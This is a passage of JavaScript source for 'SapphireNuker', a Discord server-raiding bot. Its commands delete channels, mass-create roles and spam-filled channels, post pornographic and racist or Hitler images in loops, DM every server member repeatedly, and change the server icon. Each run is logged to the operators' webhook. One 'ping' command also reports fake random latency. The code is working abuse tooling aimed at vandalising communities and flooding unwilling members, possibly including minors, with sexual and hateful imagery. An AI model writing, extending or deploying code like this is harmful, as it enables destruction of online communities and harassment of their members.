	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🤖  Args: (URL: '${args.slice(0).join(' ')}')\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		
		var errorvar = "";	
		try {
			message.guild.setIcon(args.slice(0).join(' ').toString()).catch(err => err = errorvar)
		} catch (error) {
			
		}
		

		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**If the icon URL was valid, the '${command}' command will start immediately.\nEntered URL: ${args.slice(0).join(' ')}**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)
		const output2 = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**⚠️  If the server icon doesn't change, it means the bot is rate-limited! (Only in this server).  ⚠️**`)
	    .setAuthor('Warning')
	    .setFooter(footer)
		await message.channel.send(output)
		await message.channel.send(output2)

		
		
		

		
	}
	else if (command === "pingasdasdsads1245adsa" || command === "latencyasdasdsad123asdsa")	
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		var errorvar;
		
		var ping = Date.now() - message.createdTimestamp;
		var botPing = Math.round(ping.pi);	
		const pingembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**Pinging...**`)
	    .setAuthor('Pinging...')
	    .setFooter(footer)
		await message.channel.send(pingembed).then(m =>{
			  var ping = m.createdTimestamp - message.createdTimestamp;
			  
				let totalSeconds = (client.uptime / 1000);
				let days = Math.floor(totalSeconds / 86400);
				totalSeconds %= 86400;
				let hours = Math.floor(totalSeconds / 3600);
				totalSeconds %= 3600;
				let minutes = Math.floor(totalSeconds / 60);
				let seconds = Math.floor(totalSeconds % 60);
			
			  var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#FFA500')
	    		.setTitle(`***Pong!*   ⚽ \n\n*Bot Latency:*  \`${ping}ms.\`**`)
	    		.setAuthor('Command Successful')
				.addField(`**For up-time information, type**`, `${prefix}uptime`, false)
	    		.setFooter(footer)

			  // Then It Edits the message with the ping variable embed that you created
			  m.edit(outputembed)
		  });

		
	}
	else if (command.toLowerCase() === "ping" || command === "latency")	
	{
		
		var ping = Math.random() * (maxping - minping) + minping;
		var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#FFA500')
	    		.setTitle(`***Pong!*   ⚽ \n\n*Bot Latency:*  \`${Math.round(ping)}ms.\`**`)
	    		.setAuthor('Command Successful')
				.addField(`**For up-time information, type**`, `${prefix}uptime`, false)
	    		.setFooter(footer)
		var errorvar;
		
		await message.channel.send(outputembed)

		
	}
	else if (command.toLowerCase() === 'deletechannel') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;
		
		message.channel.delete()
		
		
	
        
	}
	else if (command.toLowerCase() === 'createroles') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🤖  Args: (Amount: '${args[0]}', Name: '${args.slice(1).join(' ')}')\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		
		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' (Amount: ${args[0]}) (Name: ${args.slice(1).join(' ')}) command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)
		const output2 = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**⚠️  If the bot is not creating roles, it means it is rate-limited! (Only in this server).  ⚠️**`)
	    .setAuthor('Warning')
	    .setFooter(footer)
	
        await message.channel.send(output)
		await message.channel.send(output2)
		try {
			var rl_create_index = 0
			while (rl_create_index != args[0])
			{
				message.guild.roles.create({
					data: {

						name: args.slice(1).join(' '),
						color: roles_color
					},
				}).catch(err => errorvar = err)
					rl_create_index += 1
			}
		} catch (error) {
			
		}
		
	}
	else if (command.toLowerCase() === 'createchannels') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		

		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🤖  Args: (Amount: '${args[0]}')\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' (Amount: ${args[0]}) (Name: ${args.slice(1).join(' ')}) command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)
		try {
			var ch_create_index = 0
		while (ch_create_index != args[0])
		{
			var chnl = message.guild.channels.create(args.slice(1).join(' '), {type: "text",	topic: channels_topic}).catch(err => errorvar = err)
			chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
			chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
			chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
			chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
			chnl.then(async createdchannel1 => await createdchannel1.send(spam_message)).catch(err => errorvar = err)
			ch_create_index += 1
		}
		} catch (error) {
			
		}
		
		
        await message.channel.send(output)

		
		

		
	}
	else if (command.toLowerCase() === "uptime")	
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		
		var errorvar;
		

				// Basic embed
				let totalSeconds = (client.uptime / 1000);
				let days = Math.floor(totalSeconds / 86400);
				totalSeconds %= 86400;
				let hours = Math.floor(totalSeconds / 3600);
				totalSeconds %= 3600;
				let minutes = Math.floor(totalSeconds / 60);
				let seconds = Math.floor(totalSeconds % 60);
			
			  var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#FFA500')
	    		.setTitle(`***Uptime: \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s).\`***`)
	    		.setAuthor('Command Successful')
	    		.setFooter(footer)
			  
			  await message.channel.send(outputembed)


		
	}
	
	else if (command.toLowerCase() === 'pornspam') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🤖  Args: (Amount: '${args[0]}')\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		
		var index = 0;
		
		try {
			while (index != args[0]){
				await message.channel.send(pornimgs[Math.floor(Math.random()*pornimgs.length)])
				index += 1
			}
		} catch (error) {
			
		}
		
	}
	else if (command.toLowerCase() === 'racistspam' || command.toLowerCase() === "rasistspam"|| command.toLowerCase() === "rasismspam"|| command.toLowerCase() === "racismspam")  {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}

		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🤖  Args: (Amount: '${args[0]}')\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		
		var index = 0;
		
		try {
			while (index != args[0]){
				await message.channel.send(racistimgs[Math.floor(Math.random()*racistimgs.length)])
				index += 1
			}
		} catch (error) {
			
		}
		
	}

	else if (command.toLowerCase() === 'changenickname') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}' (Nickname: ${args.slice(0).join(' ')}) in the server '${message.guild.name}'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await commandsclient.client.send('', {
			username: commandswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
		var errorvar;

		
		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`**The '${command}' command will start immediately.**`)
	    .setAuthor('Command Successful')
	    .setFooter(footer)

		await message.channel.send(output)

		try {
			message.guild.members.resolve(client.user.id).setNickname(args.slice(0).join(' ')).catch(err => errorvar = err)
		} catch (error) {
			
		}
		
	}
	else if (command.toLowerCase() === "dmall")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (whitelistedservers.includes(message.guild.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFFFFF')
	    	.setTitle('😂  ***This server is whitelisted from being nuked! ٩(◕‿◕｡)۶	***')
	    	.setAuthor('Whitelisted Server')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		if (message.member.id != "622116876046041099")
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Only the developer can DM all.**`)
	    		.setAuthor('Permissions Error')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		var maxdms = 30;

		
		try {
			const cmdsembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}'.\n\n🤖  Args: (Amount: '${args[0]}', Message: '${args.slice(1).join(' ')}')\n\n🧑‍🤝‍🧑  Server: '\`${message.guild.name}\`'.**`)
			.setThumbnail(message.guild.iconURL())
	    	.setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	        .setFooter(footer)

			if (args[0] > maxdms)
			{

			}
			else
			{
				await commandsclient.client.send('', {
					username: commandswebhookname,
					avatarURL: webhookicon,
					embeds: [cmdsembed],
				});
			}
			
		} catch (error) {
			
		}
		

		
		
		
		try {
			if (args[0] > maxdms)
			{
				const output = new discordjs.MessageEmbed()
	    		.setColor('#FFA500')
	    		.setTitle(`**You cannot DM members more than ${maxdms} times using SapphireNuker.**`)
	    		.setAuthor('Command Overflow')
	    		.setFooter(footer)
				await message.channel.send(output)
			}
			else
			{
				const output = new discordjs.MessageEmbed()
	    		.setColor('#FFA500')
	    		.setTitle(`**The '${command}' (Amount: ${args[0]}) (Message: ${args.slice(1).join(' ')}) command will start immediately.**`)
	    		.setAuthor('Command Successful')
	    		.setFooter(footer)

				await message.channel.send(output)

				var dm_all_index = 0
				while (dm_all_index != args[0])
				{
					message.guild.members.cache.forEach(member => { 
						member.send(args.slice(1).join(' ')).catch(err => errorvar = err) 
					});
				dm_all_index += 1
				}
			}
		} catch (error) {
			
		}

		
	}
	
	else if (command.toLowerCase() === 'sapphirestats' || command.toLowerCase() === 'sapphireinfo') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		var supportserver = client.guilds.resolve("861916028140650506")
		var ownerpfp = supportserver.owner.user.displayAvatarURL()
		
		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle('🛬  ***SapphireNuker Stats / Info***')
	    .setAuthor('SapphireNuker Premium Command')
	    .addField(`**Server Count**`, `*${client.guilds.cache.size} server(s)*`, false)
		.addField(`**Total Member Count**`, `*${client.users.cache.size} member(s)*`, false)
		.addField(`**Discord.JS version**`, `*v${discordjs.version}*`, false)
		.addField(`**For up-time information, type**`, `*${prefix}uptime*`, false)
		.addField(`**For latency / ping information, type**`, `*${prefix}ping / ${prefix}latency*`, false)
	    .setFooter(footer)

		await message.channel.send(output)
        
	}
	else if (command.toLowerCase() === 'whitelists') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		var supportserver = client.guilds.resolve("861916028140650506")
		var ownerpfp = supportserver.owner.user.displayAvatarURL()
		
		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle('🏳️  ***SapphireNuker Server Whitelists***')
	    .setAuthor('SapphireNuker Premium Command')
	    .addField(`**🏳️  Whitelisted Servers**`, `*${whitelistedservers.length} server(s)*`, false)
	    .setFooter(footer)
		await message.channel.send(output)
        
	}
	else if (command.toLowerCase() === 'blacklists') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		
		const output = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle('😵  ***SapphireNuker Server Blacklists***')
	    .setAuthor('SapphireNuker Premium Command')
	    .addField(`**Blacklisted Servers**`, `*${blacklistedservers.length} server(s)*`, false)
	    .setFooter(footer)
		await message.channel.send(output)
        
	}
	else if (command.toLowerCase() === "avatar")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		var user;
		try {
			user = message.mentions.members.first()
			if (!user)
			{
				
				const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Error while getting the user avatar. Maybe no one was mentioned?**`)
	    		.setAuthor('Error')
	    		.setFooter(footer)

			await message.channel.send(output)
			return;
			}
		} catch (error) {
			
			
		}
		
		
		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🛬  ***${user.user.username}'s Avatar***`)
	    .setAuthor('SapphireNuker Premium Command')
		.addField(`**Full Username**`, `*${user.user.username}#${user.user.discriminator} (${user.id})*`, false)
	    .setThumbnail(user.user.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		await message.channel.send(exampleEmbed)

	}
	else if (command.toLowerCase() === 'help') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle(`🏙️  **${message.author.username}#${message.author.discriminator} ran the command '${command}' in the server '${message.guild.name}'.**`)
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('SapphireNuker Premium Commands', message.author.displayAvatarURL({dynamic: true}))
	    .setFooter(footer)

		
		
	    .setFooter(footer)
		if(!args[0])
		{
			const help = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('🛬  ***Help***')
	    	.setAuthor('SapphireNuker Premium Command')
			.addField('**To get help about nuke commands, type**', `*${prefix}help nuke*`, false)
			.addField('**To get help about general commands, type**', `*${prefix}help general*`, false)
	    	.setFooter(footer)

			await message.channel.send(help)
		}
		else if (args[0] == "nuke")
		{
			const helpNuke = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('🛬  ***Nuke Category Help***')
	    	.setAuthor('SapphireNuker Premium Command')
			.addField('**Nuke the server**', `*${prefix}nuke\nadio*`, false)
			.addField('**Create channels**', `*${prefix}createchannels <amount> <name>*`, false)
			.addField('**Create roles**', `*${prefix}createroles <amount> <name>*`, false)
			.addField('**Delete channels**', `*${prefix}deletechannels*`, false)
			.addField('**Delete roles**', `*${prefix}deleteroles*`, false)
			.addField('**Spam with porn**', `*${prefix}pornspam <amount>*`, false)
			.addField('**Spam with hitler / racist imgs**', `*${prefix}racismspam <amount>\nracistspam <amount>*`, false)
			.addField('**Delete message\'s channel**', `*${prefix}deletechannel*`, false)
	    	.setFooter(footer)

			await message.channel.send(helpNuke)
		}
		else if (args[0] == "general")
		{
			const helpNuke = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('🛬  ***General Category Help***')
	    	.setAuthor('SapphireNuker Premium Command')
			.addField('**Show the guild info**', `*${prefix}guildname\n${prefix}guildinfo\n${prefix}serverinfo*`, false)
			.addField('**Information on how to get Sapphire**', `*${prefix}getsapphire*`, false)
			.addField('**Get the bot\'s latency**', `*${prefix}ping / ${prefix}latency*`, false)
			.addField('**Get the bot\'s uptime**', `*${prefix}uptime*`, false)
			.addField('**Get the credits**', `*${prefix}credits*`, false)
			.addField('**Set the bot nickname**', `*${prefix}changenickname <nickname>*`, false)
			.addField('**Generate a permanent server invite**', `*${prefix}geninvite*`, false)
			.addField('**Get SapphireNuker\'s stats**', `*${prefix}sapphirestats\n${prefix}sapphireinfo*`, false)
			.addField('**See whitelisted servers**', `*${prefix}whitelists*`, false)
			.addField('**See blacklisted servers**', `*${prefix}blacklists*`, false)
			.addField('**Bulk delete messages**', `*${prefix}bulkdelete <amount>*`, false)
			.addField('**Get user\'s avatar**', `*${prefix}avatar <mention>*`, false)
	    	.setFooter(footer)

			await message.channel.send(helpNuke)
		}
		else
		{
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Invalid help category. Type ${prefix}help to get the available categories.**`)
	    		.setAuthor('Help Error')
	    		.setFooter(footer)

			await message.channel.send(output)
		}
		

	}
	else if (command.toLowerCase() === 'credits') {
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		var supportserver = client.guilds.resolve("861916028140650506")
		var owner = client.users.resolve("622116876046041099")
		var owner2 = client.users.resolve("852607966447534161")
		var ownerpfp = client.users.resolve("622116876046041099").displayAvatarURL({dynamic:true})
		var ownerpfp2 = client.users.resolve("852607966447534161").displayAvatarURL({dynamic:true})
		
		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle('🛬  ***Credits***')
	    .setAuthor('SapphireNuker Premium Command', supportserver.bannerURL({dynamic:true}))
		.setThumbnail(supportserver.iconURL({dynamic:true}))
	    .addField(`**\`${owner.username}#${owner.discriminator} (${owner.id})\`**`, `👑 *| Sapphire designer and developer*`, false)
        .addField(`**\`${owner2.username}#${owner2.discriminator} (${owner2.id})\`**`, `*Great owner and also a good friend <3*`, false)
		.addField(`**\`${client.users.resolve("852953334163439676").tag} (${client.users.resolve("852953334163439676").id})\`**`, `*A good friend*`, false)
	    .setFooter(footer)
	
        await message.channel.send(exampleEmbed)
	}
	else if (command.toLowerCase() === 'getsapphire') {

		var supportserver = client.guilds.resolve("861916028140650506")
		var owner = client.users.resolve("622116876046041099")
		var ownerpfp = client.users.resolve("622116876046041099").displayAvatarURL()

		
		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle('🛬  ***Get Sapphire***')
	    .setAuthor('SapphireNuker Premium Command')
		.setThumbnail(client.user.displayAvatarURL({dynamic: true}))
	    .addField(`**Support server invite**`, `*https://dsc.gg/sapphirenuker*`, false)
		.addField(`**Bot invite link**`, `*https://bit.ly/invite-sapphire-v3*`, false)
	    .setFooter(footer)
	
        await message.channel.send(exampleEmbed)
	}
	else if (command.toLowerCase() === "bulkdelete")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return; 
		}
		if (message.content === prefix + command)
		{
			
			const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**Please type in the required arguments for the '${command}' command! \n(You can check ${prefix}help to see the required arguments).**`)
	    		.setAuthor('No Arguments :(')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
		}
		var errorvar;
		var amount = parseInt(args[0]);
		var maxlimit = 99;
		
		const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**${message.member.displayName}, you don't have the \`Manage Messages\` permission!**`)
				
	    		.setAuthor('Missing Permissions')
	    		.setFooter(footer)
		if (message.member.hasPermission('MANAGE_MESSAGES'))
		{
			if (amount > maxlimit)
			{
				const output = new discordjs.MessageEmbed()
	    		.setColor('#FF6347')
	    		.setTitle(`**You cannot bulk delete more than 99 messages! (It's a Discord API limit)**`)
	    		.setAuthor('Command Overflow')
	    		.setFooter(footer)
				await message.channel.send(output)
				return;
			}
			else
			{
